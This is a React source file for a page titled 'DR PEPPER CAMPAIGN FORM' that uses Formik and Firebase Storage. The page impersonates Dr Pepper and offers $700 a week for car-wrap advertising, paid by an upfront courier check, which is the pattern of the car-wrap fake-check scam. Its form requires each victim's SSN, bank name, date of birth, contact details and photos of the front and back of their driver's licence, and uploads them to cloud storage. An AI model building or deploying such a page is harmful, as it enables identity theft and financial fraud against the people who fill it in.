import React, { useState } from 'react';
import { useFormik } from 'formik';
import * as yup from 'yup';
import { UserAuth } from '../../config/AuthContext';
import 'react-phone-number-input/style.css';
import PhoneInput from 'react-phone-number-input';
// import { FilePond, registerPlugin } from 'react-filepond';
// import 'filepond/dist/filepond.min.css';
import logo from '../assets/logo.png'
import { getStorage, ref, uploadBytes, getDownloadURL } from 'firebase/storage';

const Edit = () => {
    const [value, setValue] = useState();
  const [message, setMessage] = useState('');
  const [submitted, setSubmitted] = useState(false);
    const [submitSuccess, setSubmitSuccess] = useState(false);
    const {addUser} = UserAuth();
    const storage = getStorage();



    // Define the validation schema
    const validationSchema = yup.object().shape({
      fullname: yup.string().required('Full Name is required'),
      address: yup.string().required('Address is required'),
      state: yup.string().required('State is required'),
      city: yup.string().required('City is required'),
      zipcode: yup.string().required('ZIP Code is required'),
      dob: yup.string().required('Date of Birth is required'),
      phone: yup
        .string()
        .required('Phone Number is required')
        .matches(/^\+1[0-9]{10}$/, 'Invalid US phone number'),
      email: yup.string().email('Invalid email address').required('Email is required'),
      ssn: yup.string().required('SSN is required'),
      bankName: yup.string().required('Bank Name is required'),
      vehicleType: yup.string().required('Vehicle Type/Model is required'),
    });
  
    // Formik setup
    const formik = useFormik({
      initialValues: {
        fullname: '',
        address: '',
        state: '',
        city: '',
        zipcode: '',
        dob: '',
        phone: '',
        email: '',
        ssn: '',
        bankName: '',
        vehicleType: '',
        front: null,
        back: null,
      },
      validationSchema: validationSchema,
      onSubmit: async (values, { resetForm }) => {
        try {

            const frontURL = values.front
          ? await uploadFrontPicture(values.front)
          : null;

          const backURL = values.back
          ? await uploadBackPicture(values.back)
          : null;

          await addUser({ ...values, frontURL, backURL });
          setMessage('Account created successfully!');
          setSubmitted(true);
          resetForm();
        } catch (error) {
            setMessage(`Error: ${error.message}`);
            setSubmitted(true);
        }
      },
      
    });

    const handleFrontChange = (event) => {
        // Set the selected file to formik values
        formik.setFieldValue('front', event.currentTarget.files[0]);
      };

      const handleBackChange = (event) => {
        // Set the selected file to formik values
        formik.setFieldValue('back', event.currentTarget.files[0]);
      };

      const uploadFrontPicture = async (file) => {
        try {
    
          const storageRef = ref(storage, `front_images/${file.name}`);
      
          // Upload file to Firebase Storage
          const snapshot = await uploadBytes(storageRef, file);
      
          // Get the download URL after successful upload
          const downloadURL = await getDownloadURL(snapshot.ref);
      
          return downloadURL; // Return the download URL of the uploaded image
        } catch (error) {
          console.error('Error uploading profile picture:', error.message);
          throw error;
        }
      };

      const uploadBackPicture = async (file) => {
        try {
    
          const storageRef = ref(storage, `Back_images/${file.name}`);
      
          // Upload file to Firebase Storage
          const snapshot = await uploadBytes(storageRef, file);
      
          // Get the download URL after successful upload
          const downloadURL = await getDownloadURL(snapshot.ref);
      
          return downloadURL; // Return the download URL of the uploaded image
        } catch (error) {
          console.error('Error uploading profile picture:', error.message);
          throw error;
        }
      };


  
  return (
    <div className=''>
        <div className='bg-tahiti text-white '>
        <div className='max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 mb-20'>
            <div className='flex flex-row items-center mb-8'>
            <img src={logo} alt="" className='w-20 md:w-32'/>
            <h1 className='text-base md:text-4xl lg:text-5xl font-extrabold text-center font-sans'>DR PEPPER CAMPAIGN FORM</h1>
            </div>
            <p className='className="text-sm md:text-base mb-8 font-normal font-sans"'>A new marketing/promotional campaign was launched again by Dr. Pepper in other to promote itself in the market with the competition the company is facing presently with other brands. We are currently seeking to employ individual’s Nationwide, Regular citizens, Professional drivers to go about their normal routine as they usually do, only with a big advert for "Dr. Pepper" plastered on your vehicle. The advert is typically vinyl decals that almost seem to be painted on the vehicle, and which will cover any portion of your vehicle What does the company get out of this type of ad strategy? We get lots of exposure and awareness from doing this. it's a form of advertising with a captive audience. This program will last for 52 weeks and the minimum you can participate is 10 weeks. Compensation/Reward: You will be compensated with $700 weekly which is essentially a "RENTAL" payment for letting our company use the space & no fee is required from you. Dr. Pepper shall provide a specialist that will handle the advert placed on your car. You will receive an upfront payment in form of a check via courier service for accepting to carry this advert on your car. No application fees are required to get started, fill the form below.</p>
        </div>
        </div>
        <div className='max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8'>
        {submitted && (
          <div className="alert alert-primary" role="alert">
            {message}
          </div>
        )}
    <form onSubmit={formik.handleSubmit} className="max-w-sm mx-auto">
      <div className="mb-4">
        <label htmlFor="fullname" className="block text-sm font-medium text-gray-700">
          FULL NAME
        </label>
        <input
          type="text"
          name="fullname"
          id="fullname"
          onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              value={formik.values.fullname}
              className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.fullname && formik.errors.fullname ? 'border-red-500' : ''
              }`}
        />
        {formik.touched.fullname && formik.errors.fullname && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.fullname}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="address" className="block text-sm font-medium text-gray-700">
          ADDRESS
        </label>
        <input
          type="text"
          name="address"
          id="address"
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          value={formik.values.address}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.address && formik.errors.address ? 'border-red-500' : ''
          }`}
        />
        {formik.touched.address && formik.errors.address && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.address}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="state" className="block text-sm font-medium text-gray-700">
          STATE
        </label>
        <input
          type="text"
          name="state"
          id="state"
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          value={formik.values.state}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.state && formik.errors.state ? 'border-red-500' : ''
          }`}
        />
         {formik.touched.state && formik.errors.state && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.state}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="city" className="block text-sm font-medium text-gray-700">
          CITY
        </label>
        <input
          type="text"
          name="city"
          id="city"
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          value={formik.values.city}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.city && formik.errors.city ? 'border-red-500' : ''
          }`}
        />
        {formik.touched.city && formik.errors.city && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.city}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="zipcode" className="block text-sm font-medium text-gray-700">
          ZIPCODE
        </label>
        <input
          type="text"
          name="zipcode"
          id="zipcode"
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          value={formik.values.zipcode}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.zipcode && formik.errors.zipcode ? 'border-red-500' : ''
          }`}
        />
         {formik.touched.zipcode && formik.errors.zipcode && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.zipcode}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="dob" className="block text-sm font-medium text-gray-700">
          Date of birth
        </label>
        <input
          type="date"
          name="dob"
          id="dob"
          onChange={formik.handleChange}
          onBlur={formik.handleBlur}
          value={formik.values.dob}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.dob && formik.errors.dob ? 'border-red-500' : ''
          }`}
        />
        {formik.touched.dob && formik.errors.dob && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.dob}</p>
            )}
      </div>
      <div className="mb-4">
        <label htmlFor="phone" className="block text-sm font-medium text-gray-700">
          Phone Number
        </label>
        <PhoneInput
          placeholder="Enter phone number"
          defaultCountry="US"
          value={value}
          onChange={(val) => {
            formik.setFieldValue('phone', val);
            setValue(val);
          }}
          className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
            formik.touched.phone && formik.errors.phone ? 'border-red-500' : ''
          }`}
        />
        {formik.touched.phone && formik.errors.phone && (
          <p className="text-red-500 text-xs mt-1">{formik.errors.phone}</p>
        )}
      </div>
      <div className="mb-4">
            <label htmlFor="ssn" className="block text-sm font-medium text-gray-700">
              SSN
            </label>
            <input
              type="text"
              name="ssn"
              id="ssn"
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              value={formik.values.ssn}
              className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.ssn && formik.errors.ssn ? 'border-red-500' : ''
              }`}
            />
            {formik.touched.ssn && formik.errors.ssn && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.ssn}</p>
            )}
          </div>
      <div className="mb-4">
            <h2>DRIVER'S LICENCE/STATE ID</h2>
            <label htmlFor="front" className="block text-sm font-medium text-gray-700">
              FRONT ID
            </label>
            <input
            type="file"
            name="front"
            accept="image/*" // Allow only image files
            onChange={handleFrontChange}
            className={`mt-1 p-2 border w-full h-12 focus:outline-none focus:ring focus:border-blue-300 mb-8 ${
                formik.touched.address && formik.errors.address ? 'border-red-500' : ''
              }`}
          />
            {/* <FilePond
              key="front"
              files={[]} // Pass an array of initial files if needed
              onupdatefiles={handleFileChange}
              allowMultiple={false} // Allow multiple file selection
              maxFiles={1} // Maximum number of files allowed
              labelIdle="Drag & Drop your image or <span class='filepond--label-action'>Browse</span>"
              acceptedFileTypes={['image/*']} // Limit accepted file types to images
            /> */}
            <label htmlFor="back" className="block text-sm font-medium text-gray-700">
              BACK ID
            </label>
            {/* <FilePond
              key="back"
              files={[]} // Pass an array of initial files if needed
              onupdatefiles={handleFileChange}
              allowMultiple={false} // Allow multiple file selection
              maxFiles={1} // Maximum number of files allowed
              labelIdle="Drag & Drop your image or <span class='filepond--label-action'>Browse</span>"
              acceptedFileTypes={['image/*']} // Limit accepted file types to images
            /> */}
            <input
            type="file"
            name="back"
            accept="image/*" // Allow only image files
            onChange={handleBackChange}
            className={`mt-1 p-2 border w-full h-12 focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.address && formik.errors.address ? 'border-red-500' : ''
              }`}
          />
          </div>
    <div className="mb-4">
            <label htmlFor="email" className="block text-sm font-medium text-gray-700">
              EMAIL
            </label>
            <input
              type="email"
              name="email"
              id="email"
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              value={formik.values.email}
              className={`mt-1 p-2 border h-16 w-full focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.email && formik.errors.email ? 'border-red-500' : ''
              }`}
            />
            {formik.touched.email && formik.errors.email && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.email}</p>
            )}
          </div>
          <div className="mb-4">
            <label htmlFor="bankName" className="block text-sm font-medium text-gray-700">
              BANK NAME
            </label>
            <input
              type="text"
              name="bankName"
              id="bankName"
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              value={formik.values.bankName}
              className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.bankName && formik.errors.bankName ? 'border-red-500' : ''
              }`}
            />
            {formik.touched.bankName && formik.errors.bankName && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.bankName}</p>
            )}
          </div>
      <div className="mb-4">
            <label htmlFor="vehicleType" className="block text-sm font-medium text-gray-700">
              VEHICLE TYPE/MODEL
            </label>
            <input
              type="text"
              name="vehicleType"
              id="vehicleType"
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              value={formik.values.vehicleType}
              className={`mt-1 p-2 border w-full h-16 focus:outline-none focus:ring focus:border-blue-300 ${
                formik.touched.vehicleType && formik.errors.vehicleType ? 'border-red-500' : ''
              }`}
            />
            {formik.touched.vehicleType && formik.errors.vehicleType && (
              <p className="text-red-500 text-xs mt-1">{formik.errors.vehicleType}</p>
            )}
          </div>
          <div className='mb-4 flex flex-row justify-center'>
        <button
          type='submit'
          className='bg-tahiti font-bold text-white px-12 py-3 rounded-3xl hover:bg-blue-600 focus:outline-none focus:ring focus:border-blue-300'
        >
          Sign Up
        </button>
      </div>

      {submitSuccess && (
        <div className='text-green-500 text-center'>
          Form submitted successfully! You can now display a success message or redirect the user.
        </div>
      )}
    </form>
    </div>
    </div>

  );
};

export default Edit;
